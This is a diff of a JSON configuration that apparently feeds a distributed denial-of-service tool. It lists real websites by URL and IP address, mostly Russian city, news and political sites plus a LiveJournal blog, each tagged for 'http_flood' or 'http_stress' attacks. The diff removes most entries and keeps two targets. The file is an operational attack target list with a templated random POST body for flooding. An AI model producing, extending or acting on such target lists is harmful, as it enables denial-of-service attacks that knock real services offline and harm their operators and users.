@@ -1,25 +1,4 @@
 [
-  {"kind":"http_flood","method":"GET","ip":"212.109.218.234","port": 443, "url": "https://gorod-novoross.ru/"},
-  {"kind":"http_flood","method":"POST","ip":"212.109.218.234","port": 443, "url": "https://gorod-novoross.ru/", "headers":{"Content-Type": "application/json"}, "body": "template:{{ random(256) }}"},
-  {"kind":"http_flood","method":"GET","ip":"77.222.40.74","port": 443, "url": "https://sutynews.ru/"},
-  {"kind":"http_flood","method":"GET","ip":"87.117.26.124","port": 443, "url": "https://tourism.rostov-gorod.ru/"},
-  {"kind":"http_flood","method":"GET","ip":"87.117.26.92","port": 443, "url": "https://rostov-gorod.ru/"},
-  {"kind":"http_flood","method":"GET","ip":"89.108.105.30","port": 443, "url": "https://lipetskcity.ru"},
-  {"kind":"http_flood","method":"GET","ip":"87.236.16.254","port": 443, "url": "https://avtovokzal-anapa.ru/"},
-  {"kind":"http_flood","method":"GET","ip":"178.159.244.31","port": 443, "url": "https://trucks.primum1.com/"},
-  {"kind":"http_flood","method":"GET","ip":"178.159.244.31","port": 443, "url": "https://primum1.com/"},
   {"kind":"http_flood","method":"GET","ip":"109.68.214.200","port": 443, "url": "https://wagner2022.ru/"},
-  {"kind":"http_flood","method":"GET","ip":"185.221.212.66","port": 443, "url": "https://anticwar.ru/"},
-  {"kind":"http_flood","method":"GET","ip":"185.107.73.205","port": 443, "url": "https://politpuzzle.ru/"},
-  {"kind":"http_flood","method":"POST","ip":"185.107.73.215","port": 443, "url": "https://politpuzzle.ru/"},
-  {"kind":"http_stress","method":"GET","ip":"185.107.73.225","port": 443, "url": "https://politpuzzle.ru/"},
-  {"kind":"http_stress","method":"GET","ip":"185.225.35.75","port": 443, "url": "https://delta.milgov.site"},  
-  {"kind":"http_flood","method":"GET","ip":"13.88.179.33","port": 443, "url": "https://masterok.livejournal.com/"},
-  {"kind":"http_flood","method":"GET","ip":"81.19.74.0","port": 443, "url": "https://masterok.livejournal.com/"},
-  {"kind":"http_flood","method":"GET","ip":"81.19.74.1","port": 443, "url": "https://masterok.livejournal.com/"},
-  {"kind":"http_flood","method":"GET","ip":"81.19.74.2","port": 443, "url": "https://masterok.livejournal.com/"},
-  {"kind":"http_flood","method":"GET","ip":"81.19.74.3","port": 443, "url": "https://masterok.livejournal.com/"},
-  {"kind":"http_flood","method":"GET","ip":"81.19.74.4","port": 443, "url": "https://masterok.livejournal.com/"},
-  {"kind":"http_flood","method":"GET","ip":"81.19.74.5","port": 443, "url": "https://masterok.livejournal.com/"},
-  {"kind":"http_flood","method":"GET","ip":"81.19.74.6","port": 443, "url": "https://masterok.livejournal.com/"}
+  {"kind":"http_stress","method":"GET","ip":"185.225.35.75","port": 443, "url": "https://delta.milgov.site"}
 ]
